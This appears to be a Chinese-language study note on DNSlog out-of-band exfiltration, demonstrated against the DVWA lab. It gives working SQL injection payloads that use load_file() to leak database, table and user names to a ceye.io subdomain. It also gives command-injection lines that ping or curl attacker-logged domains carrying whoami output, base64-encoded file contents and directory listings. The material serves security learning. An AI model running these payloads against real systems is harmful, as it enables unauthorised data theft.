DNSlog的学习

DNSlog

域名

首先说一下域名，因为IP地址位数比较长，不方便记忆，并且不能显示地址组织的名称和性质 ，所以人们设计出了域名， IP地址和域名是一一对应的，这份域名的信息存放在一个叫域名服务器的主机内，使用者只需了解易记的域名地址，其对应转换工作就留给了域名服务器。也就是说，我们只要记住了一个网站的域名，转换成IP地址的工作就交给了DNS，我们不必管。

DNS解析过程

DNS解析过程分为两种，一种是递归，一种是迭代。如下图所示，属于迭代的DNS解析。递归其实就是本地DNS服务器发出请求后，由后面的DNS一直查询下去，直到返回结果。

DNSlog

DNSlog就是利用了DNS解析域名的特性，当我们遇到无法回显的情况时，如SQL盲注，或者没有回显结果的命令执行，我们可以想办法让靶机对一个域名发送访问请求，其中这个域名包含我们自己的域名服务器，这样我们查看域名服务器的DNS解析日志的时候，可以看到外带出来的执行结果。关于DNSlog平台，可以自己搭建，也可以用网上的，这里我用的是http://ceye.io平台进行演示。

SQL盲注

sql盲注利用DNSlog外带结果主要是用到了load_file()函数,这个函数可以通过dns解析请求。不过使用该函数需要secure_file_priv=””，可以show variables like ‘%secure%’;查看load_file()可以读取的磁盘。当secure_file_priv为空时，才可以使用该函数进行DNS解析请求。

首先在命令进行测试。登陆mysql,接着输入命令 select load_file(‘\\test.xxxx.ceye.io\aaa’);

可以看到dns解析日志有了结果

接下来在DVWA平台上进行测试。
payload:

1' union select 1,load_file(concat('//',(select database()),'.eyngtd.ceye.io/abc'))#


可以看到数据库名称被外带出来

查询数据库中的表名

payload:1' union select 1,load_file(concat('//',(select table_name from information_schema.tables where table_schema=database() limit 1,1),'.eyngtd.ceye.io/abc'))#

可以看到数据库的表名被外带出来

由于load_file()一次只能传输一条数据，所以查询的时候需要使用limit来一个一个的解析。直接用group_concat没办法解析成功，因为group_concat的默认分隔符是‘，’会影响解析。可以指定group_concat的分隔符为‘.’即可一次查询全部的表。
语法：group_concat( [distinct] 要连接的字段 [order by 排序字段 asc/desc ] [separator ‘分隔符’] )

payload:1' union select 1,load_file(concat('//',(select group_concat(table_name separator '.') from information_schema.tables where table_schema=database() ),'.eyngtd.ceye.io/abc'))#

将两张表一起查出

对于查询结果含有特殊字符的，比如@，可以将查询结果用hex()函数16进制后，再带出。

payload:1' union select 1,load_file(concat('//',(select hex(user()) ),'.eyngtd.ceye.io/abc'))#

结果转成16进制带出

Linux没有UNC路径这个东西，所以当MySQL处于Linux系统中的时候，是不能使用这种方式外带数据的。另外DNSlog还可以用于
sql server,oracel,postgreSQL,因为电脑没有装，所以就没复现了。
sql server 主要是用到了master..xp_dirtree()
学习文章：https://www.anquanke.com/post/id/98096

命令行执行无回显

有些命令执行函数是没有输出结果的，像php的exec()和shell_exec()，我们除了进行盲注之外，还可以用DNSlog外带结果。判断是否存在命令行执行的话，可以用sleep来延迟判断(linux下)。当然，在win系统可以利用ping %USERNAME%.domain.cete.io,如果外带出用户名的信息，则有命令执行。linux下的话可以

ping `whoami`.domain.ceye.io或者curl http://`whoami`.domain.ceye.io

所以在linux下，可以将文件读出到DNS日志。

payload:ping `cat 1.txt`.domain.ceye.io

如果文件中有特殊字符的话会出错(域名只能有-_符号，且不能开头)，所以可以用base64编码。但是base64编码可能会有/+=符号，所以要将这些符号替换后再ping,我个人的想法是，利用sed命令将/替换为_，将+替换为特殊字符串，如名字缩写,将=替换为特殊意义的字符串，如自己的手机号后四位。然后base64解码前先替换回来再进行解码。

payload: ping `cat 1.txt|base64|sed 's/=/3829/g;s/+/_/g;s/\//stao/g' `.domain.ceye.io

sed ‘s/原字符串/替换的字符串/‘ 文件名，加g是替换所有，不加只替换第一个符合的字符串，特殊字符要用反斜杠转义。

1.txt的内容为：12/=+

域名长度是有限制的，所以文件内容太长也会不成功，可以使用cut命令，cut -c 输出每行指定的字符。如cut -c 2-3,输出每行第2个到第3个字符。再结合sed -n。sed -n ‘行，行p’ 可以输出指定行的信息，如sed -n ‘1,2p’ 输出1行和2行的信息。
ls命令的话，同样可以用base64编码 ls|base64

payload：ls|base64|sed 's/=/3829/g'|sed -n '1p'|cut -c 1-5

payload:ping `ls|base64|sed 's/=/3829/g'|sed -n '1p'|cut -c 1-63`.eyngtd.ceye.io

测试发现，每级域名最大长度为63个字符，超过则ping不了。
